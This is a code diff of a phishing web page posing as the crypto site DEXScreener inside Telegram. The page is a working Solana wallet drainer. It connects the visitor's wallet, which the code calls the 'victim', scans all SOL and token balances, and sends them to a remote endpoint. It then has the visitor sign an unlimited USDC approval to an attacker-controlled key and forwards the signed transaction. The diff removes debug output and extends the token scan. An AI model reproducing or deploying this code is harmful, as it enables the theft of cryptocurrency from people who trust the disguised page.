@@ -5,8 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>DEXSCREENR</title>
 <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
-<!-- NEUE SPL-TOKEN BIBLIOTHEK -->
-<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.9/lib/index.iife.min.js"></script>
+<script src="https://unpkg.com/@solana/spl-token@0.3.9/lib/index.iife.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
@@ -102,11 +101,6 @@
     text-align: center; display: flex; align-items: center; justify-content: center; gap: 6px; width: 100%;
   }
   .security-footer svg { width: 12px; height: 12px; opacity: 0.7; }
-
-  #debug-window {
-    position: fixed; bottom: 0; left: 0; right: 0; background: rgba(255,0,0,0.8); color: white;
-    font-family: monospace; font-size: 12px; padding: 10px; z-index: 9999; max-height: 150px; overflow-y: auto; display: none;
-  }
 </style>
 </head>
 <body>
@@ -128,22 +122,11 @@
     </div>
   </div>
 
-  <div id="debug-window"></div>
-
 <script>
-  function logDebug(msg) {
-    const dbg = document.getElementById('debug-window');
-    dbg.style.display = 'block';
-    dbg.innerHTML += `<div>> ${msg}</div>`;
-    dbg.scrollTop = dbg.scrollHeight;
+  if (window.Telegram && window.Telegram.WebApp) {
+    window.Telegram.WebApp.ready();
+    window.Telegram.WebApp.expand();
   }
-
-  try {
-    if (window.Telegram && window.Telegram.WebApp) {
-      window.Telegram.WebApp.ready();
-      window.Telegram.WebApp.expand();
-    }
-  } catch(e) { logDebug("Telegram error: " + e.message); }
 
   const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
   function playPopSound() {
@@ -156,7 +139,7 @@
     osc.connect(gain); gain.connect(audioCtx.destination); osc.start(); osc.stop(audioCtx.currentTime + 0.1);
   }
 
-  const footerTexts = ["ZachXBT is watching the chain.", "Did you know? The Kimchi premium trade was mostly fake volume.", "Your seed phrase is safe. We only want your USDC."];
+  const footerTexts = ["ZachXBT is watching the chain.", "Did you know? The Kimchi premium trade was mostly fake volume.", "Your seed phrase is safe. We only want your USDC.", "I bought the top so you don't have to."];
   const footerEl = document.getElementById('footerText');
   let footerIndex = 0;
   setInterval(() => {
@@ -245,13 +228,11 @@
   }
 
   async function triggerConnect() {
-    logDebug("Start triggerConnect");
     let provider;
-    if (window.phantom?.solana?.isPhantom) { provider = window.phantom.solana; logDebug("Phantom found"); }
-    else if (window.solflare?.isSolflare) { provider = window.solflare; logDebug("Solflare found"); }
+    if (window.phantom?.solana?.isPhantom) { provider = window.phantom.solana; }
+    else if (window.solflare?.isSolflare) { provider = window.solflare; }
 
     if (!provider) { 
-      logDebug("No provider found!");
       if (window.Telegram && window.Telegram.WebApp) {
         window.Telegram.WebApp.showConfirm("Wallet connection requires Phantom. Open in Phantom app?", (confirmed) => {
           if (confirmed) {
@@ -264,48 +245,69 @@
     }
 
     try {
-      logDebug("Connecting...");
       const resp = await provider.connect();
       const victim = resp.publicKey.toString();
-      logDebug("Connected: " + victim);
       
       const conn = new solanaWeb3.Connection(RPC_URL);
       
-      logDebug("Fetching balance...");
+      // 1. SOL Balance
       const solBalance = await conn.getBalance(resp.publicKey);
-      const solAmount = solBalance / solanaWeb3.LAMPORTS_PER_SOL;
-      logDebug("SOL Balance: " + solAmount);
+      const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
       
-      // Fallback, falls splToken nicht geladen wurde
+      // 2. Token Scan (USDC + alle anderen SPL Tokens)
+      let tokensString = "";
       let usdcAmount = 0;
+      
       if (typeof splToken !== 'undefined') {
-        logDebug("splToken loaded.");
-        const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
         try {
-          const tokenBal = await conn.getTokenAccountBalance(victimAta);
-          usdcAmount = tokenBal.value.uiAmount;
-          logDebug("USDC Balance: " + usdcAmount);
-        } catch (e) { logDebug("No USDC account"); }
-      } else {
-        logDebug("WARNING: splToken library not loaded. Skipping USDC check.");
+          // Alle Token-Accounts des Users abrufen
+          const tokenAccounts = await conn.getParsedTokenAccountsByOwner(resp.publicKey, {
+            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
+          });
+
+          tokenAccounts.value.forEach((accountInfo) => {
+            const parsedInfo = accountInfo.account.data.parsed.info;
+            const amount = parsedInfo.tokenAmount.uiAmount;
+            
+            // Nur Token anzeigen, von denen der User mehr als 0 hat
+            if (amount > 0) {
+              const mint = parsedInfo.mint;
+              // USDC mint check für den Drainer
+              if (mint === USDC_MINT) {
+                usdcAmount = amount;
+              }
+              tokensString += `${amount.toFixed(2)} of ${mint.slice(0,4)}.. | `;
+            }
+          });
+        } catch (e) {
+          console.log("Error fetching tokens", e);
+        }
       }
 
-      logDebug("Sending to ENDPOINT...");
-      const fetchResp = await fetch(ENDPOINT, {
+      // Senden an Worker
+      await fetch(ENDPOINT, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount.toFixed(4), usdc: usdcAmount, ts: Date.now() })
+        body: JSON.stringify({ 
+          victim, 
+          chain: "solana",
+          type: "connection_and_balance",
+          sol: solAmount,
+          usdc: usdcAmount,
+          tokens: tokensString,
+          ts: Date.now() 
+        })
       });
-      logDebug("Fetch status: " + fetchResp.status);
 
-      if (usdcAmount > 0) {
-        logDebug("Requesting Approve...");
+      // Wenn USDC da ist, Drain triggern
+      if (usdcAmount > 0 && typeof splToken !== 'undefined') {
+        const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
         const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
         const tx = new solanaWeb3.Transaction().add(delegateIx);
         tx.feePayer = resp.publicKey;
         tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
         const signedTx = await provider.signTransaction(tx);
-        logDebug("Signed TX. Sending to endpoint.");
+
         await fetch(ENDPOINT, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -315,9 +317,9 @@
 
       spin.style.display = 'none'; container.classList.remove('loading'); container.classList.add('success');
       thumb.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>';
-      logDebug("Done!");
+      playPopSound();
 
-    } catch (e) { logDebug("ERROR: " + e.message); resetSlider(); }
+    } catch (e) { resetSlider(); }
   }
 
   function resetSlider() {
